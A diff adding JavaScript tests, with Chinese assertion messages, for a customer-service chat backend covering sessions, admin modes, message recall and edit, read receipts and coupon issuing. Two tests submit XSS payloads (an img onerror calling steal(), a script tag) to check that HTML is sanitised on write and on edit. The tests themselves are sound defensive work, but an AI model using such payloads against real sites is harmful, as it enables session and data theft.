+  const sxClosed = await sxCloseSession(sxDbClose, sxAsUser, sxSid, '问题解决了')
+  assert(sxClosed.status === 200, '会话所属用户可以关闭')
+  const sxCloseUpd = sxDbClose.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
+  assert(sxCloseUpd.filters.status === 'open', "关闭必须带 status='open'")
+  assert(sxCloseUpd.payload.closed_by === sxUid, '记下是谁关的')
+  const sxCloseMsg = sxDbClose.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
+  assert(String(sxCloseMsg.payload.body).includes('用户'),
+    '用户关的和客服关的要发不同的文案——同一句话会让用户以为是客服把他关掉了')
+
+  const sxCloseByStranger = await sxCloseSession(
+    recorder({ cs_sessions: { data: sxOpen, error: null } }),
+    { userId: 'nobody', group: 'presale' }, sxSid, '')
+  assert(sxCloseByStranger.status === 403, '不相关的客服不能关别人的会话')
+  const sxCloseTwice = await sxCloseSession(
+    recorder({ cs_sessions: entry => entry.op === 'update'
+      ? { data: null, error: null } : { data: sxOpen, error: null } }),
+    sxAsUser, sxSid, '')
+  assert(sxCloseTwice.status === 409, '拿不到行说明别人先关了，答 409 而不是假装成功')
+
+  // §2.5 重开：首响和超时标记要清零。留着旧值的话，一个「三天前回过、今天重开又没人理」的会话
+  // 会被 §2.13 算成已响应。
+  const sxWasClosed = {
+    ...sxOpen, status: 'closed', first_response_seconds: 12, timed_out: true, reopened_count: 1
+  }
+  const sxDbReopen = recorder({
+    cs_sessions: entry => {
+      if (entry.op === 'update') return { data: { ...sxOpen, reopened_count: 2 }, error: null }
+      // 按 id 查是 loadSession；按 status='open' 查是「有没有另一个开着的」，那次要空。
+      if (entry.filters.id === sxSid) return { data: sxWasClosed, error: null }
+      return { data: null, error: null }
+    },
+    cs_agents: { data: { online: true }, error: null },
+    cs_session_events: { data: null, error: null },
+    site_settings: sxSettings()
+  })
+  const sxReopened = await sxReopenSession(sxDbReopen, sxAsUser, sxSid)
+  assert(sxReopened.status === 200, '关闭的会话可以重开')
+  const sxReopenUpd = sxDbReopen.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
+  assert(sxReopenUpd.payload.first_response_seconds === null,
+    '重开要把首响清零：重开等于重新开始等待')
+  assert(sxReopenUpd.payload.timed_out === false, '超时标记也要清掉')
+  assert(sxReopenUpd.payload.opened_at && sxReopenUpd.payload.opened_at !== sxOpen.opened_at,
+    'opened_at 要刷新——首响是从这个时间起算的，不刷新的话下一次回复会算出三天的首响')
+  assert(sxReopenUpd.payload.reopened_count === 2, 'reopened_count 递增')
+  assert(sxReopenUpd.payload.agent_id === sxAid,
+    '原客服还在线就接回给他（§2.5「由同一客服接回」）')
+  assert(sxReopenUpd.filters.status === 'closed',
+    "重开必须带 status='closed'：两次点击不能把一个已经重开的会话再重开一次")
+
+  // 原客服离线时不能失败——用户的问题没解决，而他唯一的入口报错。要走一次重新分配。
+  const sxDbReopenOffline = recorder({
+    cs_sessions: entry => {
+      if (entry.op === 'update') return { data: { ...sxOpen, agent_id: 'other' }, error: null }
+      if (entry.filters.id === sxSid) return { data: sxWasClosed, error: null }
+      if (entry.selected === 'agent_id') return { data: [], error: null }
+      return { data: null, error: null }
+    },
+    cs_agents: entry => entry.filters.user_id
+      ? { data: { online: false }, error: null }
+      : { data: [{ user_id: 'other', online: true, max_concurrent: 5, last_heartbeat: new Date().toISOString() }], error: null },
+    user_profiles: { data: [{ user_id: 'other', group_name: 'presale' }], error: null },
+    cs_session_events: { data: null, error: null },
+    site_settings: sxSettings()
+  })
+  const sxReopenOffline = await sxReopenSession(sxDbReopenOffline, sxAsUser, sxSid)
+  assert(sxReopenOffline.status === 200, '原客服离线时仍然重开')
+  const sxOfflineUpd = sxDbReopenOffline.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
+  assert(sxOfflineUpd.payload.agent_id === 'other', '原客服离线就重新分配一个在线的')
+
+  // 同渠道已经有一个开着的会话时，重开会撞唯一索引，所以先把那个还回去。
+  const sxReopenDup = await sxReopenSession(
+    recorder({ cs_sessions: entry => entry.filters.id === sxSid
+      ? { data: sxWasClosed, error: null } : { data: sxOpen, error: null } }),
+    sxAsUser, sxSid)
+  assert(sxReopenDup.status === 409 && sxReopenDup.body.session,
+    '已有进行中会话时答 409 并把那个会话带上，前端才能直接跳过去')
+
+  // §2.10 介入模式：只有管理员能切，且要留痕。
+  const sxModeByAgent = await sxSetAdminMode(recorder(), sxAsAgent, sxSid, 'blind')
+  assert(sxModeByAgent.status === 403, '客服不能自己切介入模式')
+  const sxBadMode = await sxSetAdminMode(recorder(), sxAsAdmin, sxSid, 'invisible')
+  assert(sxBadMode.status === 400, '不认识的模式要拒绝，不能落库让 check 去报约束名')
+  const sxDbMode = recorder({
+    cs_sessions: entry => entry.op === 'update'
+      ? { data: { ...sxOpen, admin_mode: 'blind' }, error: null } : { data: sxOpen, error: null },
+    cs_messages: { data: { id: sxMid, sender_role: 'admin' }, error: null },
+    cs_session_events: { data: null, error: null }
+  })
+  const sxMode = await sxSetAdminMode(sxDbMode, sxAsAdmin, sxSid, 'blind')
+  assert(sxMode.status === 200, '管理员可以切')
+  const sxModeUpd = sxDbMode.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
+  assert(sxModeUpd.payload.admin_id === 'admin-1', '记下是哪个管理员在介入')
+  const sxModeMsg = sxDbMode.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
+  assert(sxModeMsg.payload.visible_to_user === false,
+    '介入本身对用户不可见——可见就等于告诉用户「现在是管理员在替客服说话」')
+  const sxModeEvt = sxDbMode.calls.find(c => c.table === 'cs_session_events' && c.op === 'insert')
+  assert(sxModeEvt.payload.detail?.from === 'none' && sxModeEvt.payload.detail?.to === 'blind',
+    '事件里记下从哪个模式切到哪个——只记「切过」查不出当时用户看不见的是哪一段')
+
+  const sxDbModeNone = recorder({
+    cs_sessions: entry => entry.op === 'update'
+      ? { data: sxOpen, error: null } : { data: { ...sxOpen, admin_mode: 'blind' }, error: null },
+    cs_messages: { data: { id: sxMid }, error: null },
+    cs_session_events: { data: null, error: null }
+  })
+  const sxModeNone = await sxSetAdminMode(sxDbModeNone, sxAsAdmin, sxSid, 'none')
+  assert(sxModeNone.status === 200, '可以切回 none')
+  assert(sxDbModeNone.calls.find(c => c.op === 'update').payload.admin_id === null,
+    '切回 none 要把 admin_id 清掉，否则一个退出了的管理员一直显示在会话上')
+
+  // §2.3 上下线。心跳和手动开关不能混成一个动作：一次心跳把手动设为离线的客服拉回在线，
+  // 于是他刚点了「离线」就又开始收会话。
+  const sxDbBeat = recorder({ cs_agents: { data: { user_id: sxAid, online: true }, error: null } })
+  await sxSetPresence(sxDbBeat, sxAsAgent, {})
+  const sxBeat = sxDbBeat.calls.find(c => c.table === 'cs_agents')
+  assert(!('online' in sxBeat.payload), '不带 online 的请求只更新心跳，不改在线状态')
+  assert(sxBeat.payload.last_heartbeat, '心跳时间要更新')
+  assert(sxBeat.upsertOpts?.onConflict === 'user_id',
+    'upsert 要带 onConflict：cs_agents 的主键是 user_id，漏掉就是第二次上线时撞主键')
+
+  const sxDbOff = recorder({ cs_agents: { data: { online: false }, error: null } })
+  await sxSetPresence(sxDbOff, sxAsAgent, { online: false })
+  assert(sxDbOff.calls[0].payload.online === false, '手动离线写 false')
+  assert(!sxDbOff.calls[0].payload.last_heartbeat,
+    '离线时不该更新心跳——更新了的话「他最后一次在线是什么时候」就查不出来了')
+
+  const sxPresenceByUser = await sxSetPresence(recorder(), sxAsUser, { online: true })
+  assert(sxPresenceByUser.status === 403, '普通用户不能把自己设成在线客服')
+  const sxBadCap = await sxSetPresence(recorder(), sxAsAgent, { max_concurrent: -1 })
+  assert(sxBadCap.status === 400, '负数上限要拒绝')
+  const sxNullCap = recorder({ cs_agents: { data: {}, error: null } })
+  await sxSetPresence(sxNullCap, sxAsAgent, { max_concurrent: null })
+  assert(sxNullCap.calls[0].payload.max_concurrent === null,
+    'null 是合法值，意思是「用全站默认」——不能被当成 0')
+  const sxZeroCap = recorder({ cs_agents: { data: {}, error: null } })
+  await sxSetPresence(sxZeroCap, sxAsAgent, { max_concurrent: 0 })
+  assert(sxZeroCap.calls[0].payload.max_concurrent === 0,
+    '0 要原样写下去，它的意思是「在线但不接新会话」')
+
+  // --- §4 发消息 ---------------------------------------------------------------------------------
+  const sxDbSend = recorder({
+    cs_sessions: { data: sxOpen, error: null },
+    cs_messages: { data: { id: sxMid, session_id: sxSid, sender_role: 'user', body: 'hi', auto_reply: false }, error: null },
+    cs_auto_replies: { data: [], error: null },
+    site_settings: sxSettings()
+  })
+  const sxSent = await sxSendMessage(sxDbSend, sxAsUser, { session_id: sxSid, body: 'hi' })
+  assert(sxSent.status === 201, '会话所属用户可以发言')
+  const sxSendIns = sxDbSend.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
+  assert(sxSendIns.payload.sender_role === 'user', '用户发的消息 sender_role 是 user')
+  assert(sxSendIns.payload.visible_to_user === true, '正常消息对用户可见')
+  assert(sxSendIns.payload.authored_by === null, '本人发的消息没有代发者')
+
+  const sxSendClosed = await sxSendMessage(
+    recorder({ cs_sessions: { data: { ...sxOpen, status: 'closed' }, error: null }, site_settings: sxSettings() }),
+    sxAsUser, { session_id: sxSid, body: 'hi' })
+  assert(sxSendClosed.status === 409 && /已关闭/.test(sxSendClosed.body.error),
+    '关闭的会话答 409 并说明原因——那是用户能自己解决的（重开），和没权限不同')
+
+  const sxSendReadonly = await sxSendMessage(
+    recorder({ cs_sessions: { data: { ...sxOpen, admin_mode: 'readonly' }, error: null }, site_settings: sxSettings() }),
+    sxAsAgent, { session_id: sxSid, body: 'hi' })
+  assert(sxSendReadonly.status === 403, 'readonly 模式下客服不能发言')
+  const sxSendBlind = await sxSendMessage(
+    recorder({ cs_sessions: { data: { ...sxOpen, admin_mode: 'blind' }, error: null }, site_settings: sxSettings() }),
+    sxAsAgent, { session_id: sxSid, body: 'hi' })
+  assert(sxSendBlind.status === 403, 'blind 模式下客服连发言都不行')
+  const sxSendStranger = await sxSendMessage(
+    recorder({ cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings() }),
+    { userId: 'nobody', group: 'presale' }, { session_id: sxSid, body: 'hi' })
+  assert(sxSendStranger.status === 403, '已经有客服的会话，别的客服插不进来')
+
+  // §4.4：站点没开 HTML 时，html 格式要被拒绝，而不是降级成纯文本悄悄发出去。
+  const sxSendHtmlOff = await sxSendMessage(
+    recorder({ cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings() }),
+    sxAsUser, { session_id: sxSid, body: '<b>x</b>', format: 'html' })
+  assert(sxSendHtmlOff.status === 400, '未开启 HTML 时拒绝 html 格式')
+
+  // 开了 HTML 也要清洗，而且清洗在写入时做。渲染时才清的话，库里留着的是可执行文本，
+  // 而 Realtime 推送、导出、以后任何一个页面都拿得到它。
+  const sxDbHtmlOn = recorder({
+    cs_sessions: { data: sxOpen, error: null },
+    cs_messages: { data: { id: sxMid, sender_role: 'user', format: 'html', auto_reply: false }, error: null },
+    cs_auto_replies: { data: [], error: null },
+    site_settings: sxSettings({ cs_allow_html: true })
+  })
+  await sxSendMessage(sxDbHtmlOn, sxAsUser, {
+    session_id: sxSid, format: 'html', body: '<b>正常</b><img src=x onerror="steal()">'
+  })
+  const sxHtmlIns = sxDbHtmlOn.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
+  assert(sxHtmlIns.payload.body.includes('<b>') && !/onerror/i.test(sxHtmlIns.payload.body),
+    '落库前就清洗掉 onerror：留到渲染时清，库里那行对导出和 Realtime 仍然是可执行的')
+
+  // §2.10：管理员在 normal 模式下以接待客服的身份说话，真作者记在 authored_by。
+  const sxDbAdminSpeak = recorder({
+    cs_sessions: { data: { ...sxOpen, admin_mode: 'normal' }, error: null },
+    cs_messages: { data: { id: sxMid, sender_role: 'agent', auto_reply: false }, error: null },
+    cs_auto_replies: { data: [], error: null },
+    site_settings: sxSettings()
+  })
+  await sxSendMessage(sxDbAdminSpeak, sxAsAdmin, { session_id: sxSid, body: '我来看看' })
+  const sxAdminIns = sxDbAdminSpeak.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
+  assert(sxAdminIns.payload.sender_id === sxAid && sxAdminIns.payload.sender_role === 'agent',
+    '以接待客服的身份发出——用户看到的对话要连贯')
+  assert(sxAdminIns.payload.authored_by === 'admin-1',
+    '真作者记在 authored_by：用户看不出差别，审计看得出')
+
+  // blind 模式下客服看不见这个会话，就没有「让客服显得在说话」的必要，管理员用自己的身份发。
+  const sxDbBlindSpeak = recorder({
+    cs_sessions: { data: { ...sxOpen, admin_mode: 'blind' }, error: null },
+    cs_messages: { data: { id: sxMid, sender_role: 'admin', auto_reply: false }, error: null },
+    cs_auto_replies: { data: [], error: null },
+    site_settings: sxSettings()
+  })
+  await sxSendMessage(sxDbBlindSpeak, sxAsAdmin, { session_id: sxSid, body: '我接管了' })
+  const sxBlindIns = sxDbBlindSpeak.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
+  assert(sxBlindIns.payload.sender_role === 'admin' && sxBlindIns.payload.sender_id === 'admin-1',
+    'blind 模式下以管理员自己的身份发')
+
+  // §3.1 自动回复只对用户发的消息触发。客服说了「退款」不该弹一段退款说明给用户。
+  const sxDbAgentSays = recorder({
+    cs_sessions: { data: sxOpen, error: null },
+    cs_messages: { data: { id: sxMid, sender_role: 'agent', auto_reply: false }, error: null },
+    cs_auto_replies: { data: [{ id: 'r', enabled: true, trigger: 'keyword', channel: 'both',
+      keywords: ['退款'], match_mode: 'contains', body: '退款说明', priority: 0 }], error: null },
+    site_settings: sxSettings()
+  })
+  await sxSendMessage(sxDbAgentSays, sxAsAgent, { session_id: sxSid, body: '关于退款的事' })
+  assert(!sxDbAgentSays.tables.includes('cs_auto_replies'),
+    '客服发言不查自动回复规则——查了就会给用户弹一段他没问的说明')
+
+  // --- §2.11 撤回与编辑 ---------------------------------------------------------------------------
+  // 原文要先进修订表，再从消息行里清掉。反过来的话中间失败就是原文彻底没了，
+  // 而这条需求的全部内容就是「客服仍然看得到原文」。
+  const sxMsgRow = {
+    id: sxMid, session_id: sxSid, sender_id: sxUid, sender_role: 'user', body: '我说错了',
+    format: 'plain', attachments: [{ path: `${sxSid}/a.png`, kind: 'image' }], auto_reply: false,
+    recalled: false, edit_count: 0, created_at: new Date().toISOString()
+  }
+  const sxDbRecall = recorder({
+    cs_messages: entry => entry.op === 'update'
+      ? { data: { ...sxMsgRow, recalled: true, body: '', attachments: [] }, error: null }
+      : { data: sxMsgRow, error: null },
+    cs_sessions: { data: sxOpen, error: null },
+    cs_message_revisions: { data: { id: 1 }, error: null },
+    cs_session_events: { data: null, error: null }
+  })
+  const sxRecall = await sxRecallMessage(sxDbRecall, sxAsUser, { message_id: sxMid })
+  assert(sxRecall.status === 200, '两分钟内可以撤回')
+  const sxRevIns = sxDbRecall.calls.find(c => c.table === 'cs_message_revisions' && c.op === 'insert')
+  const sxMsgUpd = sxDbRecall.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
+  assert(sxDbRecall.calls.indexOf(sxRevIns) < sxDbRecall.calls.indexOf(sxMsgUpd),
+    '先写修订再清 body：顺序反了，中间失败就等于原文丢了')
+  assert(sxRevIns.payload.body === '我说错了' && sxRevIns.payload.kind === 'recall', '原文进修订表')
+  assert(sxRevIns.payload.session_id === sxSid,
+    'cs_message_revisions 的 session_id 是 not null，漏了这一列整个撤回就报错')
+  assert(sxRevIns.payload.attachments.length === 1,
+    '附件也要搬进修订：下面那个更新把 attachments 清空了，不搬的话客服看到的「原文」少了那张图，' +
+    '而用户撤回的往往正是那张图')
+  assert(sxMsgUpd.payload.body === '' && sxMsgUpd.payload.recalled === true,
+    'body 要真的清空——留着标记不清空的话，订阅了自己会话的用户能在 Realtime 推送里读回原文')
+  assert(Array.isArray(sxMsgUpd.payload.attachments) && sxMsgUpd.payload.attachments.length === 0,
+    '行上的附件要清掉')
+  assert(sxMsgUpd.filters.recalled === false, '带 recalled=false 的条件，重复撤回不会写两条修订')
+  assert(sxRecall.body.message.recalled_body === undefined,
+    '答复给的是用户视角——原文不能顺着答复回到用户手上')
+
+  const sxRecallOther = await sxRecallMessage(
+    recorder({ cs_messages: { data: { ...sxMsgRow, sender_id: 'someone' }, error: null },
+      cs_sessions: { data: sxOpen, error: null } }),
+    sxAsUser, { message_id: sxMid })
+  assert(sxRecallOther.status === 403, '只能撤自己发的消息')
+  const sxRecallByAdmin = await sxRecallMessage(
+    recorder({ cs_messages: { data: sxMsgRow, error: null }, cs_sessions: { data: sxOpen, error: null } }),
+    sxAsAdmin, { message_id: sxMid })
+  assert(sxRecallByAdmin.status === 403,
+    '管理员也不能撤别人的消息——「管理员能撤客服的话」是另一条需求，这里没有')
+
+  const sxRecallOld = await sxRecallMessage(
+    recorder({ cs_messages: { data: { ...sxMsgRow, created_at: '2026-08-01T00:00:00.000Z' }, error: null },
+      cs_sessions: { data: sxOpen, error: null } }),
+    sxAsUser, { message_id: sxMid })
+  assert(sxRecallOld.status === 409, '超过时限不能撤回')
+  const sxRecallAuto = await sxRecallMessage(
+    recorder({ cs_messages: { data: { ...sxMsgRow, auto_reply: true }, error: null },
+      cs_sessions: { data: sxOpen, error: null } }),
+    sxAsUser, { message_id: sxMid })
+  assert(sxRecallAuto.status === 400, '自动回复不能撤回')
+  const sxRecallTwice = await sxRecallMessage(
+    recorder({ cs_messages: { data: { ...sxMsgRow, recalled: true, body: '' }, error: null } }),
+    sxAsUser, { message_id: sxMid })
+  assert(sxRecallTwice.status === 200 && sxRecallTwice.body.message.recalled === true,
+    '已撤回的再撤一次当成成功——重复点击不该看到报错')
+
+  // 编辑：旧版本进修订表，而且编辑也要过一遍清洗——否则先发一句干净的再编辑成带脚本的
+  // 就绕过了 §4.4。
+  const sxDbEdit = recorder({
+    cs_messages: entry => entry.op === 'update'
+      ? { data: { ...sxMsgRow, body: '改过了', edit_count: 1 }, error: null }
+      : { data: sxMsgRow, error: null },
+    cs_sessions: { data: sxOpen, error: null },
+    cs_message_revisions: { data: { id: 2 }, error: null },
+    cs_session_events: { data: null, error: null },
+    site_settings: sxSettings()
+  })
+  const sxEdit = await sxEditMessage(sxDbEdit, sxAsUser, { message_id: sxMid, body: '改过了' })
+  assert(sxEdit.status === 200, '两分钟内可以编辑')
+  const sxEditUpd = sxDbEdit.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
+  assert(sxEditUpd.filters.edit_count === 0,
+    '带 edit_count 的条件：同一个人开两个标签页同时编辑，输的那次拿不到行')
+  assert(sxEditUpd.payload.edit_count === 1 && sxEditUpd.payload.edited_at, 'edit_count 递增并记时间')
+  const sxEditRev = sxDbEdit.calls.find(c => c.table === 'cs_message_revisions' && c.op === 'insert')
+  assert(sxEditRev.payload.kind === 'edit' && sxEditRev.payload.body === '我说错了',
+    '进修订表的是编辑前的版本，不是编辑后的')
+  assert(sxEditRev.payload.revision === 1, 'revision 用 edit_count+1，不查一次表里的最大值')
+
+  const sxDbEditHtml = recorder({
+    cs_messages: entry => entry.op === 'update'
+      ? { data: { ...sxMsgRow, format: 'html', body: '<b>x</b>', edit_count: 1 }, error: null }
+      : { data: { ...sxMsgRow, format: 'html' }, error: null },
+    cs_sessions: { data: sxOpen, error: null },
+    cs_message_revisions: { data: { id: 3 }, error: null },
+    cs_session_events: { data: null, error: null },
+    site_settings: sxSettings({ cs_allow_html: true })
+  })
+  const sxEditHtml = await sxEditMessage(sxDbEditHtml, sxAsUser, {
+    message_id: sxMid, format: 'html', body: '<b>x</b><script>evil()</script>'
+  })
+  assert(sxEditHtml.status === 200, '开了 HTML 的站点可以编辑成 html')
+  const sxEditHtmlUpd = sxDbEditHtml.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
+  assert(!/script/i.test(sxEditHtmlUpd.payload.body),
+    '编辑也要清洗：不清就是一条「先发干净的、再编辑成带脚本的」绕过路径')
+
+  // 正文和附件都空是空消息，拒绝。sxMsgRow 带一个附件，所以这一条要用不带附件的行。
+  const sxEditEmpty = await sxEditMessage(
+    recorder({ cs_messages: { data: { ...sxMsgRow, attachments: [] }, error: null },
+      cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings() }),
+    sxAsUser, { message_id: sxMid, body: '   ' })
+  assert(sxEditEmpty.status === 400, '编辑成全空要拒绝：那是一次该走撤回的操作')
+
+  // 还有附件时把正文改成空白是合法的（删掉图片的说明文字），但要归一成空串——留着 '   '
+  // 在界面上是一个有高度、没内容的气泡，看起来像加载失败。
+  const sxDbCaption = recorder({
+    cs_messages: entry => entry.op === 'update'
+      ? { data: { ...sxMsgRow, body: '', edit_count: 1 }, error: null } : { data: sxMsgRow, error: null },
+    cs_sessions: { data: sxOpen, error: null },
+    cs_message_revisions: { data: { id: 4 }, error: null },
+    cs_session_events: { data: null, error: null },
+    site_settings: sxSettings()
+  })
+  const sxCaption = await sxEditMessage(sxDbCaption, sxAsUser, { message_id: sxMid, body: '   ' })
+  assert(sxCaption.status === 200, '有附件时可以把正文清空')
+  assert(sxDbCaption.calls.find(c => c.table === 'cs_messages' && c.op === 'update').payload.body === '',
+    '空白归一成空串，不是原样存下三个空格')
+  const sxEditRecalled = await sxEditMessage(
+    recorder({ cs_messages: { data: { ...sxMsgRow, recalled: true }, error: null } }),
+    sxAsUser, { message_id: sxMid })
+  assert(sxEditRecalled.status === 409, '已撤回的消息不能编辑')
+  const sxEditSame = await sxEditMessage(
+    recorder({ cs_messages: { data: sxMsgRow, error: null }, cs_sessions: { data: sxOpen, error: null },
+      site_settings: sxSettings() }),
+    sxAsUser, { message_id: sxMid, body: '我说错了' })
+  assert(sxEditSame.status === 200 && !sxEditSame.body.message.edited_at,
+    '内容没变就不写修订、不标 edited_at——否则客服会看到一串「编辑过」而历史里每条都一样')
+
+  // --- 读消息与已读 ------------------------------------------------------------------------------
+  // 非 staff 要在查询里就把 visible_to_user=false 的行排除掉。查回来再筛的话那些行已经进了这个
+  // 进程的内存，而下一个改这段代码的人很容易把它们带进答复。
+  const sxRecalledRow = { ...sxMsgRow, recalled: true, body: '', attachments: [] }
+  const sxDbList = recorder({
+    cs_sessions: { data: sxOpen, error: null },
+    cs_messages: { data: [sxRecalledRow], error: null },
+    cs_message_revisions: { data: [{ message_id: sxMid, kind: 'recall', body: '原文' }], error: null }
+  })
+  const sxListUser = await sxListMessages(sxDbList, sxAsUser, { session_id: sxSid })
+  const sxListSel = sxDbList.calls.find(c => c.table === 'cs_messages' && c.op === 'select')
+  assert(sxListSel.filters.visible_to_user === true,
+    '非 staff 的查询带 visible_to_user=true，在 SQL 里过滤，不在 JS 里')
+  assert(!sxDbList.tables.includes('cs_message_revisions'),
+    '用户那侧根本不查修订表——查了就是把原文取进内存')
+  assert(sxListUser.body.messages[0].recalled_body === undefined, '用户拿不到撤回原文')
+
+  const sxDbListAgent = recorder({
+    cs_sessions: { data: sxOpen, error: null },
+    cs_messages: { data: [sxRecalledRow], error: null },
+    cs_message_revisions: { data: [{ message_id: sxMid, kind: 'recall', body: '原文' }], error: null }
+  })
+  const sxListAgent = await sxListMessages(sxDbListAgent, sxAsAgent, { session_id: sxSid })
+  const sxAgentSel = sxDbListAgent.calls.find(c => c.table === 'cs_messages' && c.op === 'select')
+  assert(!('visible_to_user' in sxAgentSel.filters), '客服那侧不过滤 visible_to_user')
+  assert(sxListAgent.body.messages[0].recalled_body === '原文', '客服看得到原文')
+
+  // 没有撤回也没有编辑过的消息，不该去查一次修订表——那是一次白跑的查询，而它跑在每次拉消息上。
+  const sxDbListClean = recorder({
+    cs_sessions: { data: sxOpen, error: null },
+    cs_messages: { data: [sxMsgRow], error: null }
+  })
+  await sxListMessages(sxDbListClean, sxAsAgent, { session_id: sxSid })
+  assert(!sxDbListClean.tables.includes('cs_message_revisions'),
+    '没有撤回/编辑过的消息时不查修订表')
+
+  const sxListStranger = await sxListMessages(
+    recorder({ cs_sessions: { data: sxOpen, error: null } }),
+    { userId: 'nobody', group: 'presale' }, { session_id: sxSid })
+  assert(sxListStranger.status === 403, '已有客服的会话，别的客服读不到')
+  const sxListBlind = await sxListMessages(
+    recorder({ cs_sessions: { data: { ...sxOpen, admin_mode: 'blind' }, error: null }, cs_messages: { data: [], error: null } }),
+    sxAsAgent, { session_id: sxSid })
+  assert(sxListBlind.status === 403, 'blind 模式下接待客服也读不到——这就是「完全看不见」的意思')
+
+  // limit 要在服务端夹住。不夹的话 ?limit=999999 是一个能把整个会话历史一次拉走的调用，
+  // 而消息表是这个库里增长最快的一张。
+  const sxDbCap = recorder({
+    cs_sessions: { data: sxOpen, error: null }, cs_messages: { data: [], error: null }
+  })
+  await sxListMessages(sxDbCap, sxAsUser, { session_id: sxSid, limit: 99999 })
+  const sxCapSel = sxDbCap.calls.find(c => c.table === 'cs_messages' && c.op === 'select')
+  assert(sxCapSel.limit === 500, '超大 limit 夹到 500')
+  assert(sxCapSel.order?.col === 'created_at' && sxCapSel.order.ascending === true,
+    '按时间正序——倒序的话前端得自己翻一遍，而翻错了对话顺序就乱了')
+
+  // 已读：两侧各一列。共用一列的话，客服打开会话会把用户那侧也标成已读，
+  // 于是用户的红点在他没看的时候消失了。
+  const sxDbRead = recorder({
+    cs_sessions: { data: sxOpen, error: null },
+    cs_messages: { data: [{ id: sxMid }], error: null }
+  })
+  const sxRead = await sxMarkRead(sxDbRead, sxAsUser, { session_id: sxSid })
+  assert(sxRead.status === 200 && sxRead.body.marked === 1, '答复里带上标了几条，前端好归零红点')
+  const sxReadUpd = sxDbRead.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
+  assert('read_by_user_at' in sxReadUpd.payload && !('read_by_agent_at' in sxReadUpd.payload),
+    '用户标已读只动 read_by_user_at')
+  assert(sxReadUpd.in?.sender_role && !sxReadUpd.in.sender_role.includes('user'),
+    '用户标的是别人发的消息，不含自己发的——标自己发的没有意义')
+  assert(sxReadUpd.is && 'read_by_user_at' in sxReadUpd.is,
+    'is(null) 的条件让已读只往前推：传一个更早的时间戳不能把已读改回未读')
+
+  const sxDbReadAgent = recorder({
+    cs_sessions: { data: sxOpen, error: null }, cs_messages: { data: [], error: null }
+  })
+  await sxMarkRead(sxDbReadAgent, sxAsAgent, { session_id: sxSid })
+  const sxReadAgentUpd = sxDbReadAgent.calls.find(c => c.table === 'cs_messages' && c.op === 'update')
+  assert('read_by_agent_at' in sxReadAgentUpd.payload, '客服标已读动 read_by_agent_at')
+  assert(sxReadAgentUpd.in.sender_role.length === 1 && sxReadAgentUpd.in.sender_role[0] === 'user',
+    '客服标的只是用户发的消息')
+
+  // §7 打字状态不落库：每次按键写一行的话，这张表的写入量会超过消息表，而这个信号活两秒。
+  const sxDbTyping = recorder({
+    cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings()
+  })
+  const sxTyping = await sxTypingGate(sxDbTyping, sxAsUser, { session_id: sxSid })
+  assert(sxTyping.body.channel === `cs:${sxSid}` && sxTyping.body.as_role === 'user',
+    '只回一个广播频道名和身份，前端自己 send')
+  assert(!sxDbTyping.calls.some(c => c.op === 'insert' || c.op === 'update'),
+    '打字状态不写任何一张表')
+  const sxTypingClosed = await sxTypingGate(
+    recorder({ cs_sessions: { data: { ...sxOpen, status: 'closed' }, error: null } }),
+    sxAsUser, { session_id: sxSid })
+  assert(sxTypingClosed.status === 403, '关闭的会话不该还在显示对方正在输入')
+}
+console.log('CS sessions: OK')
+
+// --- §2.6 会话内发券 ------------------------------------------------------------------------------
+// 这个接口和 admin-coupons 的根本区别是三条限制由服务端接管。把它们交给客服填，等于每次补偿都有
+// 机会发出一张全站可用的无限量券，而那张券码会被贴到论坛上。下面每条断言对应一次「漏掉会怎样」。
+const syUid = '77777777-7777-4777-8777-777777777777'
+const syAid = '88888888-8888-4888-8888-888888888888'
+const sySid = '99999999-9999-4999-8999-999999999999'
+const syOid = 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa'
+const syMid = 'bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb'
+const syRid = 'cccccccc-cccc-4ccc-8ccc-cccccccccccc'
+const syPost = {
+  id: sySid, channel: 'postsale', user_id: syUid, order_id: syOid, agent_id: syAid,
+  status: 'open', admin_mode: 'none', first_response_seconds: null,
+  opened_at: '2026-08-29T00:00:00.000Z', created_at: '2026-08-29T00:00:00.000Z'
+}
+const syAgent = { userId: syAid, group: 'postsale' }
+const syUser = { userId: syUid, group: 'default' }
+
+// 券码：客服会把它念给用户听，或者用户手打，所以易混的字符不能出现。L 是留着的——它和 1 在
+// 常见字体里不像，去掉它只是白丢一个字符。
+const syCode = sxCouponCode(() => 0)
+assert(/^CS[A-Z2-9]{8}$/.test(syCode), '券码是 CS 前缀加八位')
+assert(!/[IO01]/.test(syCode), '码里没有 I/O/0/1——念错一个字符就是一次白跑的核销')
+assert(sxCouponCode(() => 0.999).length === 10, 'random 取到上界也不越界')
+
+const syCouponRow = {
+  id: 'c-1', code: 'CSABCDEFGH', name: '客服补偿券',
+  actions: [{ type: 'percent', value: 9000 }], ends_at: '2026-09-05T00:00:00.000Z'
+}
+const syCouponDb = (over = {}) => recorder({
+  cs_sessions: { data: syPost, error: null },
+  coupons: { data: syCouponRow, error: null },
+  cs_messages: { data: { id: syMid, sender_role: 'agent', auto_reply: false }, error: null },
+  cs_session_events: { data: null, error: null },
+  ...over
+})
+
+let syDb = syCouponDb()
+let syOut = await sxSendCoupon(syDb, syAgent, {
+  session_id: sySid,
+  actions: [{ type: 'percent', value: 9000 }],
+  // 客服试图放开限制。这四个值必须一个都不作数。
+  per_user_limit: 999, total_limit: 999, allowed_user_ids: null, code: 'FREEFORALL'
+})
+assert(syOut.status === 201, '客服可以在会话里发券')
